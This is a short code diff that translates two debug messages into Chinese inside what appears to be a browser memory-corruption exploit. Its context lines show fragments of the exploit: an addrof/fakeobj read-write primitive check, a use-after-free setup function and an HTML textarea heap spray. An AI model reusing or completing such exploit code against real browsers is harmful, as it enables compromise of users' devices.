@@ -107,7 +107,7 @@ function setupRW() {
 	g_jsview_butterfly = new Int64(bf);
 	if(!read64(g_jsview_butterfly.sub(16)).equals(new Int64("0xffff000000001337")))
 		die("[!] Failed to setup addrof/fakeobj primitives");
-	debug_log("Exploit loaded with succes !");
+	debug_log("漏洞载入成功 !");
 
 	/* Getting code execution */
 	/* ... */
@@ -394,7 +394,7 @@ function prepareUAF() {
 
 /* HTMLElement spray */
 function sprayHTMLTextArea() {
-	debug_log("Please wait for exploit loading...");
+	debug_log("请等待漏洞程序载入...");
 
 	let textarea_div_elem = document.createElement("div");
 	document.body.appendChild(textarea_div_elem);
